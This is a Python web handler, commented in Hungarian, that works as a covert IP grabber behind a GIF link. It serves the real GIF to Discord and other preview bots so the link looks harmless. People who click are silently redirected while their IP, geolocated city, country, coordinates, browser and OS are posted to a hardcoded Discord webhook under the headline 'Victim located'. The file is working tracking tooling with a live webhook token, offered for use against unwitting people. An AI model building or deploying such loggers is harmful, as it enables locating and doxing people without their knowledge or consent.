from http.server import BaseHTTPRequestHandler
from urllib import parse
import httpx
import httpagentparser

# --- KONFIGURÁCIÓ ---
webhook = 'https://discord.com/api/webhooks/1490358856919023848/KIf9rO2Q7XbwDKLjiCmEu3tSF83txYJzvJNHu5B8qkzVhqzth0kwNDOkLghZqNdvhhcz'
# Ez a GIF fog megjelenni a Discordon, és ide dobja a böngészőt is
target_gif = 'https://tenor.com/view/no-gif-23548728' 

def formatHook(ip, city, reg, country, loc, org, postal, useragent, os, browser):
    return {
        "username": "Fentanyl Logger",
        "embeds": [{
            "title": "🎯 Áldozat bemérve! (GIF kattintás)",
            "color": 16711803,
            "fields": [
                {
                    "name": "📍 Helyszín",
                    "value": f"**IP:** `{ip}`\n**Város:** `{city}`\n**Ország:** `{country}`\n**Koordináták:** `{loc}`",
                    "inline": True
                },
                {
                    "name": "💻 Eszköz",
                    "value": f"**Böngésző:** `{browser}`\n**OS:** `{os}`",
                    "inline": True
                }
            ],
            "footer": {"text": f"UserAgent: {useragent[:50]}..."}
        }]
    }

class handler(BaseHTTPRequestHandler):
    def do_GET(self):
        # 1. Adatok gyűjtése
        x_forwarded = self.headers.get('x-forwarded-for', '127.0.0.1')
        ip = x_forwarded.split(',')[0].strip()
        useragent = self.headers.get('user-agent', 'Ismeretlen')
        os, browser = httpagentparser.simple_detect(useragent)

        # 2. BOT ELLENŐRZÉS
        is_bot = any(bot in useragent.lower() for bot in ['discord', 'bot', 'telegram', 'slack'])

        if is_bot:
            # Ha a Discord bot nézi, csak a GIF-et adjuk vissza, hogy legyen előnézet
            try:
                gif_data = httpx.get(target_gif).content
                self.send_response(200)
                self.send_header('Content-type', 'image/gif')
                self.end_headers()
                self.wfile.write(gif_data)
            except:
                self.send_response(404); self.end_headers()
        else:
            # 3. VALÓDI EMBER: ÁTIRÁNYÍTÁS (Redirect)
            # Ez a rész felel azért, hogy a böngésző rögtön továbbugorjon
            self.send_response(302)
            self.send_header('Location', target_gif)
            self.end_headers()

            # 4. LOGOLÁS A HÁTTÉRBEN
            try:
                res = httpx.get(f'https://ipinfo.io/{ip}/json')
                if res.status_code == 200:
                    d = res.json()
                    hook_msg = formatHook(
                        ip, d.get('city', 'N/A'), d.get('region', 'N/A'),
                        d.get('country', 'N/A'), d.get('loc', 'N/A'),
                        d.get('org', 'N/A'), d.get('postal', 'N/A'),
                        useragent, os, browser
                    )
                    httpx.post(webhook, json=hook_msg)
            except:
                pass
